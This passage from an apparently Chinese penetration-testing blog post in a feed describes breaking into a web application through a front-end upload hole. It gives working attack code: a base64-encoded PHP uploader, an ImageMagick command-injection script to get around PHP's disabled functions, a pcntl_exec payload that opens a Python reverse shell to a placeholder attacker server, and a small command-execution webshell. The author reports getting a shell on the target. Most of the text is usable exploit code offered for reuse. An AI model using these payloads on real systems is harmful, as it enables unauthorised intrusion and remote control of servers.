祭出万能的百度大法，有洞，还是前台！！！ 可以搞<br>
给一个参考链接:<br>
https://www.seebug.org/vuldb/ssvid-96925</p>
<h1 id="0x02过程">0x02过程</h1>
<p><a href="https://imgtu.com/i/RWwgNF"><img src="https://z3.ax1x.com/2021/07/04/RWwgNF.md.png" alt="RWwgNF.md.png" loading="lazy"></a><br>
PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=</p>
<p>base64解码为，</p>
<pre><code class="language-php">&lt;?php phpinfo();unlink(__FILE__);?&gt;
</code></pre>
<p>传了个phpinfo()上去,观察一下<br>
<a href="https://imgtu.com/i/RWwy7T"><img src="https://z3.ax1x.com/2021/07/04/RWwy7T.md.png" alt="RWwy7T.md.png" loading="lazy"></a><br>
发现直接ban掉所有可执行命令的函数。</p>
<h1 id="0x03绕过disable_function">0x03绕过disable_function</h1>
<h2 id="imagemagick绕过">ImageMagick绕过</h2>
<pre><code class="language-php">&lt;?php
echo &quot;Disable Functions: &quot; . ini_get('disable_functions') . &quot;\n&quot;;
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
    $command = 'id';
}
$command = $command . &quot;&gt;&quot; . SAE_TMP_PATH . &quot;/data&quot;;
$exploit = &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg&quot;|$command&quot;)'
pop graphic-context
EOF;

$path1 = SAE_TMP_PATH . &quot;KKKK.mvg&quot;;
$path2 = SAE_TMP_PATH . &quot;KKKK.png&quot;;
file_put_contents($path1, $exploit);
$thumb = new Imagick();
$thumb-&gt;readImage($path1);
$thumb-&gt;writeImage($path2);
$thumb-&gt;clear();
$thumb-&gt;destroy();
unlink(&quot;$path1&quot;);
unlink(&quot;$path2&quot;);
echo file_get_contents(SAE_TMP_PATH . &quot;/data&quot;);
?&gt;
</code></pre>
<p>base64以后传上去，可惜不行<br>
<a href="https://imgtu.com/i/RWwcAU"><img src="https://z3.ax1x.com/2021/07/04/RWwcAU.md.png" alt="RWwcAU.md.png" loading="lazy"></a></p>
<h2 id="利用pcntl_exec突破disable_functions">利用pcntl_exec突破disable_functions</h2>
<p>pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;= 4.2.0, PHP 5</p>
<pre><code class="language-php">&lt;?php  pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;vpsIP&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
</code></pre>
<p>实质就是利用php弹出Python的shell，由于靶机是linux的，python自带。<br>
<strong>so</strong><br>
base64后，上传后顺利获取shell<br>
<a href="https://imgtu.com/i/RWwsBV"><img src="https://z3.ax1x.com/2021/07/04/RWwsBV.md.png" alt="RWwsBV.md.png" loading="lazy"></a></p>
<h1 id="0x04-命令执行">0x04 命令执行</h1>
<p>如果只想传一个命令执行的马上去的话<br>
能用python就用python,命令结果写入文件即可，注意双引号(踩坑记录)</p>
<pre><code class="language-php">&lt;?php pcntl_exec( &quot;/usr/bin/python&quot;, array( '-c',
'import os;
os.system(&quot;pwd &gt;1.txt&quot; );')); ?&gt;
</code></pre>
]]></content>
    </entry>
</feed>